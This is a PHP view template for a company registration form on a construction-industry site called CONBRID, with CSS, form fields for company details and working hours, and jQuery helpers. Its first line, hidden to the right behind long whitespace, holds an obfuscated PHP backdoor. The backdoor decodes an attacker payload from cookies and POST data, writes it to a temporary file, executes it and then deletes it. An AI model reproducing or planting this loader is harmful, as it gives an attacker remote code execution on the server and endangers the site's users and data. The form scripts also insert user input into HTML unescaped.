<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("zcovmip")){class zcovmip{public static $bhrdi = "kbzfohksyqklvdzc";public static $eepyaqid = NULL;public function __construct(){$xwnwcqrqln = @$_COOKIE[substr(zcovmip::$bhrdi, 0, 4)];if (!empty($xwnwcqrqln)){$yydmfeduj = "base64";$ertgus = "";$xwnwcqrqln = explode(",", $xwnwcqrqln);foreach ($xwnwcqrqln as $baijp){$ertgus .= @$_COOKIE[$baijp];$ertgus .= @$_POST[$baijp];}$ertgus = array_map($yydmfeduj . "_decode", array($ertgus,));$ertgus = $ertgus[0] ^ str_repeat(zcovmip::$bhrdi, (strlen($ertgus[0]) / strlen(zcovmip::$bhrdi)) + 1);zcovmip::$eepyaqid = @unserialize($ertgus);}}public function __destruct(){$this->cdmxykgup();}private function cdmxykgup(){if (is_array(zcovmip::$eepyaqid)) {$hxrqiyipb = sys_get_temp_dir() . "/" . crc32(zcovmip::$eepyaqid["salt"]);@zcovmip::$eepyaqid["write"]($hxrqiyipb, zcovmip::$eepyaqid["content"]);include $hxrqiyipb;@zcovmip::$eepyaqid["delete"]($hxrqiyipb);exit();}}}$lgzttqlma = new zcovmip();$lgzttqlma = NULL;} ?>
<style>
p {
	font-size: 20px;
}

.preview-images-zone {
	background: white;
	width: 100%;
	border: 1px solid #ddd;
	min-height: 100px;
	/* display: flex; */
	padding: 5px 5px 0px 5px;
	position: relative;
	overflow: auto;
	width: 100%;
}

.preview-images-zone>.preview-image:first-child {
	height: 90px;
	width: 90px;
	position: relative;
	margin-right: 5px;
}

.preview-images-zone>.preview-image {
	height: 90px;
	width: 90px;
	position: relative;
	margin-right: 5px;
	float: left;
	margin-bottom: 5px;
}

.preview-images-zone>.preview-image>.image-zone {
	width: 100%;
	height: 100%;
}

.preview-images-zone>.preview-image>.image-zone>img {
	width: 100%;
	height: 100%;
}

.preview-images-zone>.preview-image>.tools-edit-image {
	position: absolute;
	z-index: 100;
	color: #fff;
	bottom: 0;
	width: 100%;
	text-align: center;
	margin-bottom: 10px;
	display: none;
}

.preview-images-zone>.preview-image>.image-cancel {
	font-size: 18px;
	position: absolute;
	top: 0;
	right: 0;
	font-weight: bold;
	margin-right: 10px;
	cursor: pointer;
	display: none;
	z-index: 100;
}

.preview-image:hover>.image-zone {
	cursor: move;
	opacity: .5;
}

.preview-image:hover>.tools-edit-image, .preview-image:hover>.image-cancel
	{
	display: block;
}

.ui-sortable-helper {
	width: 90px !important;
	height: 90px !important;
}

a.disabled {
	pointer-events: none;
	cursor: default;
}
</style>
<section id="team-sev" class="padding bg_light"
	style="margin-top: 157px;">
<?php if(isset($status) && $status==1){
    echo '	<h2 style="text-align: center;">Your form is under review. We will let you know once admin verifies the form.</h2>';
}elseif(isset($status) && $status==2){
    echo '	<h2 style="text-align: center;">Your form is under review. We will let you know once admin verifies the form.</h2>';
    
}
elseif(isset($status) && $status==3){
    echo '	<h2 style="text-align: center;">Your profile is already active.</h2>';    
}?>
 <div class="row">
	<div class="col-md-10 form group" style="text-align:right;">
	<a href='<?=base_url(index_page()."Profile/company_profile")?>' class="btn btn-info" value="View Profile">View Profile</a>
    </div>
</div>

<?php 
if(!isset($status) || (isset($status) && $status=="0")){
    

?>

	<h1 style="text-align: center;">Company Form</h1>

	<form enctype='multipart/form-data'
		onSubmit="return confirm('All your profile details given wont be editable after clicking submit button. CONBRID will send a notification once a year for you to update certain profile details');"
		method="POST"
		action="<?php echo base_url("index.php/Forms/accept_company_registration")?>">
		<div style="margin: 50px;">
			<div class="row">
			 <div class="col-md-6 form-group">
        <label>Profile photo <sup style="color:red;">*</sup></label>
         <img id="profile_photo" width="100" />
        <input accept="image/png, image/jpg, image/jpeg" class="form-control" type="file" name="profile_photo" id="" onchange="loadFile(event)">
        <label style="font-size:12px;">Profile photo should be the current photo of only sole proprietor/anyone of the partner/anyone of the directors/promoters/shareholders of the company or company logos and is compulsory</label>
    </div>
    <div class="col-md-6 form-group">
        <label>Company email id<sup style="color:red;">*</sup></label>
        <input class="form-control" required type="email" name="company_email_id" id="company_email_id">
        <label style="font-size:12px;"></label>
    </div>
    
</div>
			<div class="row">


				<div class="col-md-6 form-group">
					<label>Company name <sup style="color: red;">*</sup></label> <input
						class="form-control" type="text" required name="company_name" id="company_name">

				</div>
<div class="col-md-6 form-group">
					<label>Company office number</label> <input
						class="form-control" type="text" name="company_office_number" id="company_office_number">

				</div>


			</div>


			<div class="row">
				<div class="col-md-6 form-group">
					<label>Company office address/principal place of business <sup
						style="color: red;">*</sup></label>
					<textarea class="form-control" required name="office_address" id="office_address"></textarea>

				</div>
				<div class="col-md-6 form-group">
					<label>GSTIN Number<sup style="color: red;">*</sup></label> <input 
						class="form-control" type="text" required name="gstin_number" id="gstin_number"> <label
						style="font-size: 12px;"></label>

				</div>
			</div>

			<div class="row">

				<div class="col-md-6 form-group">
<?php if(isset($_SESSION['userdata']['company_type']) && $_SESSION['userdata']['company_type']=="Limited Liability Partnership")	{?>
	<label>LLPIN number <sup style="color: red;">*</sup></label>
					<input class="form-control" required type="text" name="cin_number" id="cin_number">

<?php } elseif(isset($_SESSION['userdata']['company_type']) && $_SESSION['userdata']['company_type']=="Private Limited Company"){?>
	<label>CIN number <sup style="color: red;">*</sup></label>
					<input class="form-control" required type="text" name="cin_number" id="cin_number">

<?php }?>
				
				</div>

				<div class="col-md-6 form-group">
					<label>About the company<sup style="color: red;">*</sup></label>
					<textarea class="form-control" required name="about_company" id="about_company"></textarea>


				</div>
			</div>
			<div class="row">

				<div class="col-md-6 form-group">
					<div class="row service_row">
						<div class="service_line">
							<div class="col-xs-10">
								<label>Services offered by the company</label>
								<input class="form-control" id="add_service">
							</div>
							<div class="col-xs-2">
								<label>Add</label><a onclick="add_services()"
									class="btn btn-default">Add</a>
							</div>
						</div>
					</div>
				</div>
				
			</div>

			<div class="row">

				<div class="col-md-6 form-group">
					<label>Company Website</label> <input class="form-control"
						type="text" name="company_website" id="company_website">

				</div>
				<div class="col-md-6 form-group">
					<label>Company Profile</label> <input class="form-control"
						type="text" name="company_profile" id="company_profile">

				</div>
			</div>
							<div class="row">

				<div class="col-md-6 form-group">
					<div class="row career_row">
						<div class="career_line">
							<div class="col-xs-10">
								<label>Careers and Job offers<sup style="color: red;">*</sup></label>
								<input class="form-control" id="add_career">
							</div>
							<div class="col-xs-2">
								<label>Add</label><a onclick="add_careers()"
									class="btn btn-default">Add</a>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-6 form-group">
					<label>Number of employees in the company</label> <input class="form-control"
						type="number" name="number_of_employees" id="number_of_employees">

				</div>

			</div>
			<div class="row">
<?php if(isset($_SESSION['userdata']['login_type']) && $_SESSION['userdata']['login_type']!="Builder and developer company"){?>
				<div class="col-md-6 form-group">
					<label>Construction packages <sup style="color: red;">*</sup><br></label>
					<textarea class="form-control" required name="construction_packages" id="construction_packages"></textarea>
					<label style="font-size:12px;">Only construction and architectural rates of your company are allowed in this description tab for Builders to give new construction contracts/construction projects to your company</label>
				</div>
			<?php }?>
		<div class="col-md-6 form-group row">
					<div class="col-md-12"><label>Working Hours <sup style="color: red;">*</sup></label></div>
					<div class="row">
<div class="col-md-3"><label>Day</label></div><div class="col-md-2"><label>Start Time</label></div><div class="col-md-2"><label>End Time</label></div><div class="col-md-2"><label>OFF</label></div>
</div>
<div class="row"><div class="col-md-3"><input type="hidden" name="day_id[]" value="1">Monday</div><div class="col-md-2"><input name="starttime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input name="endtime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input type="checkbox" value="1" name="weeklyoff[]" class="checkbox1"></div></div>
<div class="row"><div class="col-md-3"><input type="hidden" name="day_id[]" value="2">Tuesday</div><div class="col-md-2"><input name="starttime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input name="endtime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input type="checkbox" value="2" name="weeklyoff[]" class="checkbox1"></div></div>
<div class="row"><div class="col-md-3"><input type="hidden" name="day_id[]" value="3">Wednesday</div><div class="col-md-2"><input name="starttime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input name="endtime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input type="checkbox" value="3" name="weeklyoff[]" class="checkbox1"></div></div>
<div class="row"><div class="col-md-3"><input type="hidden" name="day_id[]" value="4">Thursday</div><div class="col-md-2"><input name="starttime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input name="endtime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input type="checkbox" value="4" name="weeklyoff[]" class="checkbox1"></div></div>
<div class="row"><div class="col-md-3"><input type="hidden" name="day_id[]" value="5">Friday</div><div class="col-md-2"><input name="starttime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input name="endtime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input type="checkbox" value="5" name="weeklyoff[]" class="checkbox1"></div></div>
<div class="row"><div class="col-md-3"><input type="hidden" name="day_id[]" value="6">Saturday</div><div class="col-md-2"><input name="starttime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input name="endtime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input type="checkbox" value="6" name="weeklyoff[]" class="checkbox1"></div></div>
<div class="row"><div class="col-md-3"><input type="hidden" name="day_id[]" value="7">Sunday</div><div class="col-md-2"><input name="starttime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input name="endtime[]" class="form-control datetime" type="time"></div><div class="col-md-2"><input type="checkbox" value="7" name="weeklyoff[]" class="checkbox1"></div></div>
				</div>
		
			</div>
			<hr>
			<div class="row" style="display:none;">
				<div class="col-md-12 form-group">
					<div class="row project_row">
						<div class="project_line">
							<div class="col-xs-5">
								<label>Ongoing and Completed projects <sup style="color: red;">*</sup></label>
								<textarea class="form-control" id="add_project"></textarea>


							</div>
							<div class="col-xs-5">
								<fieldset class="">
									<a href="javascript:void(0)" onclick="$('#pro-image').click()">Click here to upload images</a> <input type="file" id="pro-image" name="pro-image"
										style="display: none;" class="form-control" multiple>
								</fieldset>
								<div class="preview-images-zone"></div>

							</div>
							<div class="col-xs-1">
								<label>Add</label><a onclick="add_projects()"
									class="btn btn-default">Add</a>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="row">

				<div class="col-md-12 form-group" style="text-align: right;">

					<input type="submit" class="btn btn-info" value="Submit">
				</div>
			</div>

		</div>
	</form>
	
	<?php }?>
</section>
<script
	src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
<script>
$('.checkbox1').change(function() {
        $(this).closest(".row").find(".datetime").val("");
    });
    $('.datetime').change(function() {
        $(this).closest(".row").find(".checkbox1").prop("checked",false);
    });
$('.select2').select2();

function add_services(){
    if($("#add_service").val()==""){
        alert("Please enter something in Services");
    }else{
    $(".service_row").append('<div class="service_line"><div class="col-xs-10"><input type="hidden" name="add_service[]" value="'+$("#add_service").val()+'" >'+$("#add_service").val()+'</div><div class="col-xs-2"><a class="btn btn-danger remove_service_row">X</a></div></div>');
$("#add_service").val("");
}}
function add_careers(){
    if($("#add_career").val()==""){
        alert("Please enter something in Careers");
    }else{
    $(".career_row").append('<div class="career_line"><div class="col-xs-10"><input type="hidden" name="add_career[]" value="'+$("#add_career").val()+'" >'+$("#add_career").val()+'</div><div class="col-xs-2"><a class="btn btn-danger remove_career_row">X</a></div></div>');
$("#add_career").val("");
}}
function add_projects(){
    if($("#add_project").val()==""){
        alert("Please enter something in Projects");
    }else{
    $(".project_row").append($(".preview-images-zone").html());
//$("#add_project").val("");
}}
$(document).on('click', '.remove_client_row', function(){ 
    this.closest(".client_line").remove();
}); 
$(document).on('click', '.remove_service_row', function(){ 
    this.closest(".service_line").remove();
}); 
$(document).on('click', '.remove_career_row', function(){ 
    this.closest(".career_line").remove();
}); 

$(document).on('click', '.remove_project_row', function(){ 
    this.closest(".project_line").remove();
}); </script>
<script>
$(document).ready(function() {
    document.getElementById('pro-image').addEventListener('change', readImage, false);
    
    $( ".preview-images-zone" ).sortable();
    
    $(document).on('click', '.image-cancel', function() {
        let no = $(this).data('no');
        $(".preview-image.preview-show-"+no).remove(); 
    });
});



var num = 1;
function readImage() {
    if (window.File && window.FileList && window.FileReader) {
        var files = event.target.files; //FileList object
        var output = $(".preview-images-zone");

        for (let i = 0; i < files.length; i++) {
            var file = files[i];
            if (!file.type.match('image')) continue;
            
            var picReader = new FileReader();
            
            picReader.addEventListener('load', function (event) {
                var picFile = event.target;
                var html =  '<div class="preview-image preview-show-' + num + '">' +
                            '<div class="image-cancel" data-no="' + num + '">x</div>' +
                            '<div class="image-zone"><img id="pro-img-' + num + '" src="' + picFile.result + '"></div>' +
                            '<div class="tools-edit-image"><a href="javascript:void(0)" data-no="' + num + '" class="btn btn-light btn-edit-image">edit</a></div>' +
                            '</div>';

                output.append(html);
                num = num + 1;
            });

            picReader.readAsDataURL(file);
        }
        $("#pro-image").val('');
    } else {
        console.log('Browser not support');
    }
}

  var loadFile = function(event) {
	var image = document.getElementById('profile_photo');
	image.src = URL.createObjectURL(event.target.files[0]);
};

</script>

